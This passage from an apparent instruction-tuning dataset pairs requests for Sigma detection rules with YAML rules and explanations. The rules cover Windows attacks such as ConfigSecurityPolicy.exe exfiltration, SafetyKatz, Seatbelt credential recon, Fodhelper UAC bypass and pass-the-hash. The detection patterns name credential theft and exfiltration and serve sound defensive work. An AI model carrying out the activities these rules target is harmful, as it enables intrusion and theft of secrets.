    "instruction": "Build a Sigma rule with the goal of detecting Upload file, credentials or data exfiltration with Binary part of Windows Defender.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to upload file, credentials or data exfiltration with Binary part of Windows Defender, you should: identify processes created on Windows systems that exhibit suspicious behavior associated with the misuse of the ConfigSecurityPolicy.exe binary, which is a part of Windows Defender. Specifically, look for instances where the command line execution or image path of a process involves ConfigSecurityPolicy.exe. Additionally, pay attention to processes that execute commands containing internet URLs, indicated by the presence of 'https://', 'http://', or 'ftp://' in the command line. This combination of using ConfigSecurityPolicy.exe alongside commands that reach out to the internet is indicative of an attempt to use trusted Windows utilities to facilitate malicious activities such as uploading files, exfiltrating credentials, or other data exfiltration efforts. Be aware that some legitimate activities may trigger this detection, although such occurrences are currently unknown. The severity level of this type of suspicious activity is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    lolbas:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    remote:\n        CommandLine|contains:\n            - 'https://'\n            - 'http://'\n            - 'ftp://'\n    condition: lolbas and remote\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    lolbas:\n        - CommandLine|contains: ConfigSecurityPolicy.exe\n        - Image|endswith: '\\ConfigSecurityPolicy.exe'\n        - OriginalFileName: 'ConfigSecurityPolicy.exe'\n    remote:\n        CommandLine|contains:\n            - 'https://'\n            - 'http://'\n            - 'ftp://'\n    condition: lolbas and remote\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Upload file, credentials or data exfiltration with Binary part of Windows Defender",
      "answer": "In order to upload file, credentials or data exfiltration with Binary part of Windows Defender, you should: identify processes created on Windows systems that exhibit suspicious behavior associated with the misuse of the ConfigSecurityPolicy.exe binary, which is a part of Windows Defender. Specifically, look for instances where the command line execution or image path of a process involves ConfigSecurityPolicy.exe. Additionally, pay attention to processes that execute commands containing internet URLs, indicated by the presence of 'https://', 'http://', or 'ftp://' in the command line. This combination of using ConfigSecurityPolicy.exe alongside commands that reach out to the internet is indicative of an attempt to use trusted Windows utilities to facilitate malicious activities such as uploading files, exfiltrating credentials, or other data exfiltration efforts. Be aware that some legitimate activities may trigger this detection, although such occurrences are currently unknown. The severity level of this type of suspicious activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious powershell processes which include bxor command, alternative obfuscation method to b64 encoded commands, you should: Monitor Windows PowerShell classic event logs for activities. Particularly, watch out for instances where the host name matches 'ConsoleHost'. Among these, focus on filtering events where the host application's command contains specific keywords such as 'bxor', 'join', or 'char'. These keywords are indicative of possible obfuscation techniques being used, with 'bxor' being of special interest as it signifies a method of obfuscation different from the commonly known base64 encoding methods. This approach aims at identifying and analyzing suspicious PowerShell activities that could be attempting to evade detection through the use of sophisticated obfuscation. The detection level for this kind of activity is considered medium, acknowledging there might be unknown scenarios leading to false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_classic_start\n    definition: fields have to be extract from event\ndetection:\n    selection:\n        HostName: 'ConsoleHost'\n    filter:\n        HostApplication|contains:\n            - 'bxor'\n            - 'join'\n            - 'char'\n    condition: selection and filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_classic_start\n    definition: fields have to be extract from event\ndetection:\n    selection:\n        HostName: 'ConsoleHost'\n    filter:\n        HostApplication|contains:\n            - 'bxor'\n            - 'join'\n            - 'char'\n    condition: selection and filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.",
      "answer": "In order to detect suspicious powershell processes which include bxor command, alternative obfuscation method to b64 encoded commands, you should: Monitor Windows PowerShell classic event logs for activities. Particularly, watch out for instances where the host name matches 'ConsoleHost'. Among these, focus on filtering events where the host application's command contains specific keywords such as 'bxor', 'join', or 'char'. These keywords are indicative of possible obfuscation techniques being used, with 'bxor' being of special interest as it signifies a method of obfuscation different from the commonly known base64 encoding methods. This approach aims at identifying and analyzing suspicious PowerShell activities that could be attempting to evade detection through the use of sophisticated obfuscation. The detection level for this kind of activity is considered medium, acknowledging there might be unknown scenarios leading to false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the hacktool SafetyKatz via PE information and default Image name.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the hacktool SafetyKatz via PE information and default Image name, you should: Focus on monitoring process creation logs within Windows environments for any instances where the image name ends with '\\SafetyKatz.exe', the original file name is specified as 'SafetyKatz.exe', or the description is exactly 'SafetyKatz'. These indicators are critical for identifying potential malicious activities associated with SafetyKatz, a well-known tool used in cyber attacks for extracting sensitive information. The detection of such activities is crucial, with false positives being unlikely, indicating a high confidence in these specific attributes as indicators of compromise. By focusing on these specific characteristics within the process creation logs, efforts can be concentrated on a vital aspect of monitoring for malicious activity, aligning with tactics and techniques that include but are not limited to credential access.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\SafetyKatz.exe'\n        - OriginalFileName: 'SafetyKatz.exe'\n        - Description: 'SafetyKatz'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "execution of the hacktool SafetyKatz via PE information and default Image name",
      "answer": "In order to detect the execution of the hacktool SafetyKatz via PE information and default Image name, you should: Focus on monitoring process creation logs within Windows environments for any instances where the image name ends with '\\SafetyKatz.exe', the original file name is specified as 'SafetyKatz.exe', or the description is exactly 'SafetyKatz'. These indicators are critical for identifying potential malicious activities associated with SafetyKatz, a well-known tool used in cyber attacks for extracting sensitive information. The detection of such activities is crucial, with false positives being unlikely, indicating a high confidence in these specific attributes as indicators of compromise. By focusing on these specific characteristics within the process creation logs, efforts can be concentrated on a vital aspect of monitoring for malicious activity, aligning with tactics and techniques that include but are not limited to credential access."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remote Utilities Host service installation on the target system..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Remote Utilities Host service installation on the target system, you should: \n\nMonitor Windows system logs for the occurrence of event ID 7045, which is an indication of a new service installation managed by the Service Control Manager. Specifically, look for the installation of a service named \"Remote Utilities - Host\". This can be identified by the presence of the executable path containing \"\\rutserv.exe\" in conjunction with the \"-service\" command line argument, indicating it runs as a user mode service and is configured to auto-start. The account associated with this service typically runs under the \"LocalSystem\" account. It's essential to be vigilant for such installations as they can serve as indicators of potential unauthorized remote access tools being deployed on the system. However, it's also important to consider that there may be legitimate uses of the tool, so verification is recommended to differentiate between benign and malicious intents. The detection level is set to medium, emphasizing the need for further investigation upon alerts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    # Example:\n    #   <EventData>\n    #       <Data Name=\"ServiceName\">Remote Utilities - Host</Data>\n    #       <Data Name=\"ImagePath\">\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" -service</Data>\n    #       <Data Name=\"ServiceType\">user mode service</Data>\n    #       <Data Name=\"StartType\">auto start</Data>\n    #       <Data Name=\"AccountName\">LocalSystem</Data>\n    #   </EventData>\n    selection_root:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service:\n        - ImagePath|contains|all:\n            - '\\rutserv.exe'\n            - '-service'\n        - ServiceName: 'Remote Utilities - Host'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    # Example:\n    #   <EventData>\n    #       <Data Name=\"ServiceName\">Remote Utilities - Host</Data>\n    #       <Data Name=\"ImagePath\">\"C:\\Program Files (x86)\\Remote Utilities - Host\\rutserv.exe\" -service</Data>\n    #       <Data Name=\"ServiceType\">user mode service</Data>\n    #       <Data Name=\"StartType\">auto start</Data>\n    #       <Data Name=\"AccountName\">LocalSystem</Data>\n    #   </EventData>\n    selection_root:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection_service:\n        - ImagePath|contains|all:\n            - '\\rutserv.exe'\n            - '-service'\n        - ServiceName: 'Remote Utilities - Host'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use of the tool\nlevel: medium\n",
      "question": "Remote Utilities Host service installation on the target system.",
      "answer": "In order to detect Remote Utilities Host service installation on the target system, you should: \n\nMonitor Windows system logs for the occurrence of event ID 7045, which is an indication of a new service installation managed by the Service Control Manager. Specifically, look for the installation of a service named \"Remote Utilities - Host\". This can be identified by the presence of the executable path containing \"\\rutserv.exe\" in conjunction with the \"-service\" command line argument, indicating it runs as a user mode service and is configured to auto-start. The account associated with this service typically runs under the \"LocalSystem\" account. It's essential to be vigilant for such installations as they can serve as indicators of potential unauthorized remote access tools being deployed on the system. However, it's also important to consider that there may be legitimate uses of the tool, so verification is recommended to differentiate between benign and malicious intents. The detection level is set to medium, emphasizing the need for further investigation upon alerts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting executable downloads from suspicious remote systems.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect executable downloads from suspicious remote systems, you should focus on monitoring proxy server logs for specific file extension downloads that are typical for executables and scripts. These extensions include 'exe', 'vbs', 'bat', 'rar', 'ps1', 'doc', 'docm', 'xls', 'xlsm', 'pptm', 'rtf', 'hta', 'dll', 'ws', 'wsf', 'sct', 'zip'. Such files may be used by attackers to execute malicious code on a target system.\n\nAdditionally, it is important to screen the hostnames of the sources of these downloads, specifically excluding those that end with common top-level domains like '.com', '.org', '.net', '.edu', '.gov', '.uk', '.ca', '.de', '.jp', '.fr', '.au', '.us', '.ch', '.it', '.nl', '.se', '.no', '.es'. This exclusion helps to reduce false positives by focusing on less common or unexpected download sources that might indicate a higher risk or suspicious activity.\n\nKey information to collect during this detection process includes the Client IP address and the URI of the downloaded file. It is worth noting that this method may yield false positives, such as legitimate software downloads, and is considered to have a low level of threat on its own. However, when combined with other indicators of compromise, it can be a valuable part of a comprehensive cyber threat detection and response strategy.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri-extension:\n            - 'exe'\n            - 'vbs'\n            - 'bat'\n            - 'rar'\n            - 'ps1'\n            - 'doc'\n            - 'docm'\n            - 'xls'\n            - 'xlsm'\n            - 'pptm'\n            - 'rtf'\n            - 'hta'\n            - 'dll'\n            - 'ws'\n            - 'wsf'\n            - 'sct'\n            - 'zip'\n            # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/\n    filter:\n        cs-host|endswith:\n            - '.com'\n            - '.org'\n            - '.net'\n            - '.edu'\n            - '.gov'\n            - '.uk'\n            - '.ca'\n            - '.de'\n            - '.jp'\n            - '.fr'\n            - '.au'\n            - '.us'\n            - '.ch'\n            - '.it'\n            - '.nl'\n            - '.se'\n            - '.no'\n            - '.es'\n            # Extend this list as needed\n    condition: selection and not filter\nfields:\n    - ClientIP\n    - c-uri\nfalsepositives:\n    - All kind of software downloads\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri-extension:\n            - 'exe'\n            - 'vbs'\n            - 'bat'\n            - 'rar'\n            - 'ps1'\n            - 'doc'\n            - 'docm'\n            - 'xls'\n            - 'xlsm'\n            - 'pptm'\n            - 'rtf'\n            - 'hta'\n            - 'dll'\n            - 'ws'\n            - 'wsf'\n            - 'sct'\n            - 'zip'\n            # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/\n    filter:\n        cs-host|endswith:\n            - '.com'\n            - '.org'\n            - '.net'\n            - '.edu'\n            - '.gov'\n            - '.uk'\n            - '.ca'\n            - '.de'\n            - '.jp'\n            - '.fr'\n            - '.au'\n            - '.us'\n            - '.ch'\n            - '.it'\n            - '.nl'\n            - '.se'\n            - '.no'\n            - '.es'\n            # Extend this list as needed\n    condition: selection and not filter\nfields:\n    - ClientIP\n    - c-uri\nfalsepositives:\n    - All kind of software downloads\nlevel: low\n",
      "question": "executable downloads from suspicious remote systems",
      "answer": "In order to detect executable downloads from suspicious remote systems, you should focus on monitoring proxy server logs for specific file extension downloads that are typical for executables and scripts. These extensions include 'exe', 'vbs', 'bat', 'rar', 'ps1', 'doc', 'docm', 'xls', 'xlsm', 'pptm', 'rtf', 'hta', 'dll', 'ws', 'wsf', 'sct', 'zip'. Such files may be used by attackers to execute malicious code on a target system.\n\nAdditionally, it is important to screen the hostnames of the sources of these downloads, specifically excluding those that end with common top-level domains like '.com', '.org', '.net', '.edu', '.gov', '.uk', '.ca', '.de', '.jp', '.fr', '.au', '.us', '.ch', '.it', '.nl', '.se', '.no', '.es'. This exclusion helps to reduce false positives by focusing on less common or unexpected download sources that might indicate a higher risk or suspicious activity.\n\nKey information to collect during this detection process includes the Client IP address and the URI of the downloaded file. It is worth noting that this method may yield false positives, such as legitimate software downloads, and is considered to have a low level of threat on its own. However, when combined with other indicators of compromise, it can be a valuable part of a comprehensive cyber threat detection and response strategy."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the PUA/Recon tool Seatbelt via PE information of command line parameters.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters, you should: focus on monitoring process creations within Windows environments. Specifically, be vigilant for the initiation of processes where the image name ends with '\\Seatbelt.exe', the original file name is identified as 'Seatbelt.exe', or the description directly mentions 'Seatbelt'. Furthermore, scrutinizing the command line parameters is crucial as Seatbelt can be executed with various commands that signify different reconnaissance activities, such as gathering information about DPAPI master keys, processes, files deemed interesting, certificate thumbprints, Chromium bookmarks and history, presence of Chromium, cloud credentials, credentials enumeration and Credential Guard, Firefox history, and process creation events among others.\n\nAdditionally, pay attention to the execution of Seatbelt with parameters indicating the use of grouped commands like '-group=misc', '-group=remote', '-group=chromium', '-group=slack', '-group=system', '-group=user', or '-group=all'. These grouped commands likely encapsulate multiple reconnaissance operations in one execution. Detection efforts should also encompass cases where Seatbelt is executed with an intent to output the gathered information to a file, identifiable by command line parameters containing ' -outputfile='.\n\nGiven the nature of these indicators, it's considered highly unlikely to encounter false positives, indicating that occurrences matching these descriptions should be treated with a high level of scrutiny. The methodology here focuses on the detection of malicious reconnaissance activities, commonly associated with tactics and techniques like discovery, Credential Access, and Collection within MITRE ATT&CK's framework for understanding adversary behaviors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Seatbelt.exe'\n        - OriginalFileName: 'Seatbelt.exe'\n        - Description: 'Seatbelt'\n        - CommandLine|contains:\n            # This just a list of the commands that will produce the least amount of FP in \"theory\"\n            # Comment out/in as needed in your environment\n            # To get the full list of commands see reference section\n            - ' DpapiMasterKeys'\n            - ' InterestingProcesses'\n            - ' InterestingFiles'\n            - ' CertificateThumbprints'\n            - ' ChromiumBookmarks'\n            - ' ChromiumHistory'\n            - ' ChromiumPresence'\n            - ' CloudCredentials'\n            - ' CredEnum'\n            - ' CredGuard'\n            - ' FirefoxHistory'\n            - ' ProcessCreationEvents'\n            #- ' RDPSessions'\n            #- ' PowerShellHistory'\n    selection_group_list:\n        CommandLine|contains:\n            - ' -group=misc'\n            - ' -group=remote'\n            - ' -group=chromium'\n            - ' -group=slack'\n            - ' -group=system'\n            - ' -group=user'\n            - ' -group=all'\n    selection_group_output:\n        CommandLine|contains: ' -outputfile='\n    condition: selection_img or all of selection_group_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Seatbelt.exe'\n        - OriginalFileName: 'Seatbelt.exe'\n        - Description: 'Seatbelt'\n        - CommandLine|contains:\n            # This just a list of the commands that will produce the least amount of FP in \"theory\"\n            # Comment out/in as needed in your environment\n            # To get the full list of commands see reference section\n            - ' DpapiMasterKeys'\n            - ' InterestingProcesses'\n            - ' InterestingFiles'\n            - ' CertificateThumbprints'\n            - ' ChromiumBookmarks'\n            - ' ChromiumHistory'\n            - ' ChromiumPresence'\n            - ' CloudCredentials'\n            - ' CredEnum'\n            - ' CredGuard'\n            - ' FirefoxHistory'\n            - ' ProcessCreationEvents'\n            #- ' RDPSessions'\n            #- ' PowerShellHistory'\n    selection_group_list:\n        CommandLine|contains:\n            - ' -group=misc'\n            - ' -group=remote'\n            - ' -group=chromium'\n            - ' -group=slack'\n            - ' -group=system'\n            - ' -group=user'\n            - ' -group=all'\n    selection_group_output:\n        CommandLine|contains: ' -outputfile='\n    condition: selection_img or all of selection_group_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "execution of the PUA/Recon tool Seatbelt via PE information of command line parameters",
      "answer": "In order to detect the execution of the PUA/Recon tool Seatbelt via PE information of command line parameters, you should: focus on monitoring process creations within Windows environments. Specifically, be vigilant for the initiation of processes where the image name ends with '\\Seatbelt.exe', the original file name is identified as 'Seatbelt.exe', or the description directly mentions 'Seatbelt'. Furthermore, scrutinizing the command line parameters is crucial as Seatbelt can be executed with various commands that signify different reconnaissance activities, such as gathering information about DPAPI master keys, processes, files deemed interesting, certificate thumbprints, Chromium bookmarks and history, presence of Chromium, cloud credentials, credentials enumeration and Credential Guard, Firefox history, and process creation events among others.\n\nAdditionally, pay attention to the execution of Seatbelt with parameters indicating the use of grouped commands like '-group=misc', '-group=remote', '-group=chromium', '-group=slack', '-group=system', '-group=user', or '-group=all'. These grouped commands likely encapsulate multiple reconnaissance operations in one execution. Detection efforts should also encompass cases where Seatbelt is executed with an intent to output the gathered information to a file, identifiable by command line parameters containing ' -outputfile='.\n\nGiven the nature of these indicators, it's considered highly unlikely to encounter false positives, indicating that occurrences matching these descriptions should be treated with a high level of scrutiny. The methodology here focuses on the detection of malicious reconnaissance activities, commonly associated with tactics and techniques like discovery, Credential Access, and Collection within MITRE ATT&CK's framework for understanding adversary behaviors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify use of Fodhelper.exe to bypass User Account Control, which adversaries use this technique to execute privileged processes, you should: Monitor the creation of processes on Windows systems, specifically examining if any process has been initiated by 'fodhelper.exe' as its parent process. It's vital to log and examine the computer name, username involved, and the exact command line used during the process creation. However, be mindful that there can be legitimate uses of 'fodhelper.exe' by authorized users, and such instances should not be hastily labeled as malicious without further investigation. This activity is recognized as a high-severity issue due to its relation to techniques that seek to execute operations with elevated privileges.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\fodhelper.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of fodhelper.exe utility by legitimate user\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\fodhelper.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Legitimate use of fodhelper.exe utility by legitimate user\nlevel: high\n",
      "question": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.",
      "answer": "In order to identify use of Fodhelper.exe to bypass User Account Control, which adversaries use this technique to execute privileged processes, you should: Monitor the creation of processes on Windows systems, specifically examining if any process has been initiated by 'fodhelper.exe' as its parent process. It's vital to log and examine the computer name, username involved, and the exact command line used during the process creation. However, be mindful that there can be legitimate uses of 'fodhelper.exe' by authorized users, and such instances should not be hastily labeled as malicious without further investigation. This activity is recognized as a high-severity issue due to its relation to techniques that seek to execute operations with elevated privileges."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting attack technique pass the hash which is used to move laterally inside the network.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the attack technique pass the hash which is used to move laterally inside the network, you should monitor specific events and conditions within Windows security logs. Focus on capturing event IDs 4624, which signify a successful logon, and 4625, which indicate a failed logon attempt. These events are particularly relevant when the logon type is 3, representing a network logon which is commonly used during lateral movement attempts. Additionally, the logon process name should be 'NtLmSsp', which is indicative of NTLM (NT LAN Manager) authentication, often exploited in pass the hash attacks.\n\nIt is crucial to pay attention to the originating and target workstation names in these events. The condition implies that both the workstation from where the logon attempt was made and the target computer should match your network's workstation naming conventions (referred here as '%Workstations%'). This helps in pinpointing the attempts that are specifically targeted at moving laterally within your network.\n\nHowever, it's important to exclude any logon attempts that are recorded with the target username as 'ANONYMOUS LOGON'. These might not be related to malicious activity and can lead to false positives. Speaking of which, legitimate administrator activities could also trigger these conditions and should be considered when evaluating alerts.\n\nThis focused monitoring approach, by analyzing network logon attempts via the NTLM authentication involving specific workstations, aids in discerning potential lateral movement activities facilitated by pass the hash attacks. It stands on the medium level of alert severity due to the balance between the necessity of detecting malicious activities and the potential for false positives, such as routine administrator tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        EventID:\n            - 4624\n            - 4625\n        LogonType: 3\n        LogonProcessName: 'NtLmSsp'\n        WorkstationName: '%Workstations%'\n        ComputerName: '%Workstations%'\n    filter:\n        TargetUserName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625\ndetection:\n    selection:\n        EventID:\n            - 4624\n            - 4625\n        LogonType: 3\n        LogonProcessName: 'NtLmSsp'\n        WorkstationName: '%Workstations%'\n        ComputerName: '%Workstations%'\n    filter:\n        TargetUserName: 'ANONYMOUS LOGON'\n    condition: selection and not filter\nfalsepositives:\n    - Administrator activity\nlevel: medium\n",
      "question": "attack technique pass the hash which is used to move laterally inside the network",
      "answer": "In order to detect the attack technique pass the hash which is used to move laterally inside the network, you should monitor specific events and conditions within Windows security logs. Focus on capturing event IDs 4624, which signify a successful logon, and 4625, which indicate a failed logon attempt. These events are particularly relevant when the logon type is 3, representing a network logon which is commonly used during lateral movement attempts. Additionally, the logon process name should be 'NtLmSsp', which is indicative of NTLM (NT LAN Manager) authentication, often exploited in pass the hash attacks.\n\nIt is crucial to pay attention to the originating and target workstation names in these events. The condition implies that both the workstation from where the logon attempt was made and the target computer should match your network's workstation naming conventions (referred here as '%Workstations%'). This helps in pinpointing the attempts that are specifically targeted at moving laterally within your network.\n\nHowever, it's important to exclude any logon attempts that are recorded with the target username as 'ANONYMOUS LOGON'. These might not be related to malicious activity and can lead to false positives. Speaking of which, legitimate administrator activities could also trigger these conditions and should be considered when evaluating alerts.\n\nThis focused monitoring approach, by analyzing network logon attempts via the NTLM authentication involving specific workstations, aids in discerning potential lateral movement activities facilitated by pass the hash attacks. It stands on the medium level of alert severity due to the balance between the necessity of detecting malicious activities and the potential for false positives, such as routine administrator tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting WMI script event consumers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect WMI script event consumers, you should: monitor the creation of processes in Windows systems, specifically targeting instances where the \"scrcons.exe\" executable, located in the C:\\WINDOWS\\system32\\wbem\\ directory, is initiated by the \"svchost.exe\" process from the C:\\Windows\\System32\\ directory. This scenario is indicative of WMI (Windows Management Instrumentation) script event consumers being used, potentially for malicious purposes. It's important to note, however, that there might be legitimate uses of this behavior, such as events generated by legitimate software or system functionalities (e.g., Dell computer systems adjusting brightness using a specific keyboard button might trigger such events and lead to false positives). The risk level associated with this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: C:\\WINDOWS\\system32\\wbem\\scrcons.exe\n        ParentImage: C:\\Windows\\System32\\svchost.exe\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\n    - Dell computers on some versions register an event consumer that is known to cause false positives when brightness is changed by the corresponding keyboard button\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: C:\\WINDOWS\\system32\\wbem\\scrcons.exe\n        ParentImage: C:\\Windows\\System32\\svchost.exe\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\n    - Dell computers on some versions register an event consumer that is known to cause false positives when brightness is changed by the corresponding keyboard button\nlevel: medium\n",
      "question": "WMI script event consumers",
      "answer": "In order to detect WMI script event consumers, you should: monitor the creation of processes in Windows systems, specifically targeting instances where the \"scrcons.exe\" executable, located in the C:\\WINDOWS\\system32\\wbem\\ directory, is initiated by the \"svchost.exe\" process from the C:\\Windows\\System32\\ directory. This scenario is indicative of WMI (Windows Management Instrumentation) script event consumers being used, potentially for malicious purposes. It's important to note, however, that there might be legitimate uses of this behavior, such as events generated by legitimate software or system functionalities (e.g., Dell computer systems adjusting brightness using a specific keyboard button might trigger such events and lead to false positives). The risk level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious \"epmap\" connection to a remote computer via remote procedure call (RPC).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious \"epmap\" connection to a remote computer via remote procedure call (RPC), you should focus on monitoring network connections, specifically within Windows environments. Look for TCP protocol connections that are initiated by the source and target destination port 135, which is commonly used by \"epmap\" or RPC services. It is essential to filter out legitimate system connections initiated by Windows or Amazon SSM (Simple Systems Manager) agent updater. These legitimate connections commonly start with the directories \"C:\\Windows\\\" and \"C:\\ProgramData\\Amazon\\SSM\\Update\\amazon-ssm-agent-updater\". Connections that do not originate from these paths and meet the other specified criteria should be considered suspicious. The associated tactics and techniques include Execution and Lateral Movement, where attackers might leverage RPC to execute commands remotely or move within the network. Paying attention to these details with a high level of scrutiny is crucial due to the high impact level of potential findings, although the exact nature of false positives remains uncertain.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Protocol: tcp\n        Initiated: 'true'\n        DestinationPort: 135\n        #DestinationPortName: epmap\n    filter:\n        Image|startswith:\n            - C:\\Windows\\\n            - C:\\ProgramData\\Amazon\\SSM\\Update\\amazon-ssm-agent-updater\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Protocol: tcp\n        Initiated: 'true'\n        DestinationPort: 135\n        #DestinationPortName: epmap\n    filter:\n        Image|startswith:\n            - C:\\Windows\\\n            - C:\\ProgramData\\Amazon\\SSM\\Update\\amazon-ssm-agent-updater\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious \"epmap\" connection to a remote computer via remote procedure call (RPC)",
      "answer": "In order to detect suspicious \"epmap\" connection to a remote computer via remote procedure call (RPC), you should focus on monitoring network connections, specifically within Windows environments. Look for TCP protocol connections that are initiated by the source and target destination port 135, which is commonly used by \"epmap\" or RPC services. It is essential to filter out legitimate system connections initiated by Windows or Amazon SSM (Simple Systems Manager) agent updater. These legitimate connections commonly start with the directories \"C:\\Windows\\\" and \"C:\\ProgramData\\Amazon\\SSM\\Update\\amazon-ssm-agent-updater\". Connections that do not originate from these paths and meet the other specified criteria should be considered suspicious. The associated tactics and techniques include Execution and Lateral Movement, where attackers might leverage RPC to execute commands remotely or move within the network. Paying attention to these details with a high level of scrutiny is crucial due to the high impact level of potential findings, although the exact nature of false positives remains uncertain."
    }
  },
  {
